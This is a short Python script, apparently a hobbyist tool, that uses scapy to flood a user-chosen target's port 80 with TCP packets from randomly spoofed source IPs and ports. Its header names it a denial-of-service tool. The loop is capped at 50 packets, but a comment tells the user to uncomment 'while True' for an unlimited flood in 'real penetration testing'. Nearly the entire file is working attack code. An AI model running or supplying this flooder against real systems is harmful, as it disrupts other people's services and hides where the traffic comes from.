##############################################################
#   Simple Denial of Services from Multiple Ports and IPs    #
##############################################################
import random
from scapy.all import *
print '#'*40
target = raw_input("Enter the Target IP: ")
print '#'*40
i=1

def randomIP ():
    a = str(random.randint(1,254))
    b = str(random.randint(1,254))
    c = str(random.randint(1,254))
    d = str(random.randint(1,254))
    dot = "."
    src = a+dot+b+dot+c+dot+d
    return src

#Remove the Comment in Real Penetration Testing
#while True:
while i < 2:
    regPort = random.randint(1024,49151)
    dynPort = random.randint(49152,65535)
    loop_break = 0
    for srcport in range(regPort,dynPort):
        src = randomIP()
        PIP = IP(src=src, dst=target)
        PTCP = TCP(sport=srcport, dport=80)
        pkt = PIP / PTCP
        send(pkt,inter= .001)
        print "Packet Sent ", i
        loop_break = loop_break+1
        i=i+1
        if loop_break == 50 :
            break
